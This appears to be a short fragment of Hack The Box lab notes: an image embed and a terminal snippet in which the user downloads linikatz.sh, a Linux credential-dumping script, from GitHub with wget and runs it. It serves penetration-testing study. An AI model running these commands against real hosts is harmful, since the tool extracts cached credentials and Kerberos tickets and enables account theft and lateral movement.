...
![[Pasted image 20260228084614.png|697]]
...
```
HrithikManoj000@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh HrithikManoj000@htb[/htb]$ /opt/linikatz.sh
```
